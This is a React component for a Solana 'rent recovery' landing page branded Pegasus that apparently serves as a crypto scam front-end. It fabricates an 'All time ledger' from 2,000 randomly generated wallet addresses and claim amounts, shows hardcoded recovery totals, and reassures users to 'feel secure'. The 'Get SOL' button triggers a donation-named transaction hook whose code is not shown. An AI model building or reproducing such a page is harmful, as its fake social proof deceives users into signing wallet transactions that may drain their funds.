import React, { useState, useEffect } from 'react';
import { useWallet } from '@solana/wallet-adapter-react';
import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
import { Link } from 'react-router-dom';
import { ArrowLeft } from 'lucide-react';
import AnimatedBackground from '@/components/AnimatedBackground';
import { Button } from '@/components/ui/button';
import { usePump } from '@/hooks/useDonation';

interface WalletData {
  address: string;
  accts: number;
  claimed: number;
  date: string;
}

const WhyChoosePegasus: React.FC = () => {
  const { select, wallets, connected } = useWallet();
  const { startDonation, isProcessing } = usePump();
  const [walletData, setWalletData] = useState<WalletData[]>([]);
  const [visibleCount, setVisibleCount] = useState<number>(20);

  // Generate random wallet addresses and data
  const generateWalletData = () => {
    const data: WalletData[] = [];
    const today = new Date();
    
    for (let i = 0; i < 2000; i++) {
      const walletAddress = Array.from({ length: 32 }, () => 
        'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'[Math.floor(Math.random() * 62)]
      ).join('');
      
      const daysAgo = i < 20 ? 0 : Math.floor(Math.random() * 30) + 1;
      const date = new Date(today);
      date.setDate(date.getDate() - daysAgo);
      
      data.push({
        address: walletAddress,
        accts: Math.floor(Math.random() * 13) + 1,
        claimed: Math.random() * (2 - 0.02121) + 0.02121,
        date: date.toISOString().split('T')[0]
      });
    }
    
    return data;
  };

  useEffect(() => {
    setWalletData(generateWalletData());
  }, []);

  const handleResetWallet = () => {
    select(null);
  };

  const formatNumber = (num: number) => {
    return num.toLocaleString('en-US', { maximumFractionDigits: 3 });
  };

  return (
    <div className="min-h-screen flex flex-col relative">
      {/* Animated Background */}
      <AnimatedBackground />
      <div className="relative z-10 max-w-6xl mx-auto p-8 text-white">
        {/* Back Navigation */}
        <div className="mb-8">
          <Link 
            to="/" 
            className="inline-flex items-center text-blue-400 hover:text-blue-300 transition-colors"
          >
            <ArrowLeft className="w-4 h-4 mr-2" />
            Back to Home
          </Link>
        </div>

        {/* Header Section */}
        <div className="text-center mb-12">
          {/* Image above the text */}
          <div className="mb-8">
            <img
              src="/6044015843546434463 (1).jpg"
              alt="Pegasus Logo"
              className="mx-auto h-32 w-32 rounded-full border-4 border-blue-500 shadow-lg"
              onError={(e) => {
                const img = e.currentTarget as HTMLImageElement;
                img.src = '/pegasus.png';
              }}
            />
          </div>
          <h1 className="text-5xl font-normal mb-6">
            Solana Blockchain keeps your SOL!
          </h1>
          <h2 className="text-4xl font-bold mb-2">
            You can get it back!
          </h2>
          <p className="text-lg text-gray-300 mb-8">
            Solana Network: ~3918 TPS
          </p>
          
          {/* Connect or Get SOL button */}
          {!connected ? (
            <WalletMultiButton className="relative z-20 bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 px-8 rounded-lg text-lg mb-4" />
          ) : (
            <Button
              variant="pump"
              size="xl"
              onClick={startDonation}
              disabled={isProcessing}
              className="relative z-20 w-full max-w-sm mx-auto bg-gradient-to-r from-blue-400 to-blue-600 hover:from-blue-500 hover:to-blue-700 mb-4"
            >
              Get SOL
            </Button>
          )}
          
          <p className="text-sm text-gray-400 mb-8">
            Click here to reset Wallet Selector
          </p>
        </div>

        {/* Stats Boxes */}
        <div className="flex justify-center gap-8 mb-12">
          {/* Total SOL Recovered Box */}
          <div className="bg-gray-800 rounded-lg p-8 text-center min-w-[250px]">
            <h3 className="text-lg font-semibold mb-4">Total SOL Recovered</h3>
            <div className="text-3xl font-bold text-blue-400 mb-2">92.5K</div>
            <div className="text-lg mb-2">SOL</div>
            <div className="text-sm text-gray-400">92,497</div>
          </div>

          {/* Total Accounts Claimed Box */}
          <div className="bg-gray-800 rounded-lg p-8 text-center min-w-[250px]">
            <h3 className="text-lg font-semibold mb-4">Total Accounts Claimed</h3>
            <div className="text-3xl font-bold text-blue-400 mb-2">56.7M</div>
            <div className="text-lg mb-2">56,662,789</div>
          </div>
        </div>

        {/* All Time Ledger Section */}
        <div className="mb-12">
          <h2 className="text-2xl font-bold mb-6 text-center">All time ledger</h2>
          <div className="bg-gray-800 rounded-lg overflow-hidden">
            <div className="overflow-x-auto">
              <table className="w-full">
                <thead className="bg-gray-700">
                  <tr>
                    <th className="px-6 py-4 text-left font-semibold">Wallet Address</th>
                    <th className="px-6 py-4 text-left font-semibold">Accts</th>
                    <th className="px-6 py-4 text-left font-semibold">Claimed</th>
                    <th className="px-6 py-4 text-left font-semibold">Date</th>
                  </tr>
                </thead>
                <tbody>
                  {walletData.slice(0, visibleCount).map((wallet, index) => (
                    <tr key={index} className="border-b border-gray-700 hover:bg-gray-750">
                      <td className="px-6 py-4 font-mono text-sm">
                        {wallet.address.slice(0, 8)}...{wallet.address.slice(-8)}
                      </td>
                      <td className="px-6 py-4">{wallet.accts}</td>
                      <td className="px-6 py-4 text-blue-400">
                        {wallet.claimed.toFixed(5)} SOL
                      </td>
                      <td className="px-6 py-4 text-gray-300">{wallet.date}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
          {/* Show more control */}
          {visibleCount < walletData.length && (
            <div className="text-center mt-4">
              <button
                className="text-blue-400 hover:text-blue-300 underline"
                onClick={() => setVisibleCount(walletData.length)}
              >
                Show more
              </button>
            </div>
          )}
        </div>

        {/* Donation Notice */}
        <div className="text-center mb-12">
          <p className="text-sm text-gray-400">
            To keep this tool up and running, a 20% donation is included for the recovered SOL.
          </p>
        </div>

        {/* Information Section */}
        <div className="bg-gray-800 rounded-lg p-8 mb-8">
          <h2 className="text-2xl font-bold mb-6">How does it work?</h2>
          
          <div className="space-y-6 text-gray-300">
            <div>
              <h3 className="text-lg font-semibold text-white mb-2">Closing SPL Token Accounts</h3>
              <p>
                Everytime you receive a Memecoin, Token or NFT in your wallet a specific token account is created for it.
              </p>
            </div>

            <div>
              <p>
                When you send or sell that Memecoin, Token or NFT to someone else, the token account has 0 units of that specific asset but still lingers in your wallet with no utility.
              </p>
            </div>

            <div>
              <p>
                To create each and single one of those accounts someone paid ~0.002 SOL for rent that is withheld by Solana Network forever.
              </p>
            </div>

            <div>
              <p>
                With our tool you can easily and securely close this accounts and claim your SOL.
              </p>
            </div>

            <div>
              <h3 className="text-lg font-semibold text-white mb-2">Claim Your SOL</h3>
              <p>
                All the token accounts that show up for selection already have 0 assets assigned and have no use, feel secure in selecting as many as you want and let us do the work.
              </p>
            </div>

            <div>
              <p>
                The selected tokens accounts are closed and the released rent deposits are sent to you, we take a small donation from profits to keep this Site + RPC running and developing more tools.
              </p>
            </div>

            <div>
              <h3 className="text-lg font-semibold text-white mb-2">What is this rent?</h3>
              <p>
                Solana currently charges users 2 years worth of rent for every account created to storage, maintain the data and process transactions with those accounts.
              </p>
            </div>

            <div>
              <p>
                You can find more information in the official Solana Documentation.
              </p>
            </div>

            <div>
              <h3 className="text-lg font-semibold text-white mb-2">I need more help!</h3>
              <p>
                We have a curated collection of step-by-step guides covering the most commonly used wallets, Telegram bots, and trading tools within the Solana ecosystem. Whether you're new to Solana or just need a refresher, these resources are designed to get you up to speed quickly and confidently.
              </p>
            </div>

            <div>
              <p>
                At the top of the page, you'll also find quick-access links to our Discord, X and Telegram communities, where you can ask questions or get real-time support.
              </p>
            </div>

            <div>
              <p>
                Explore the full set of guides at:
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default WhyChoosePegasus;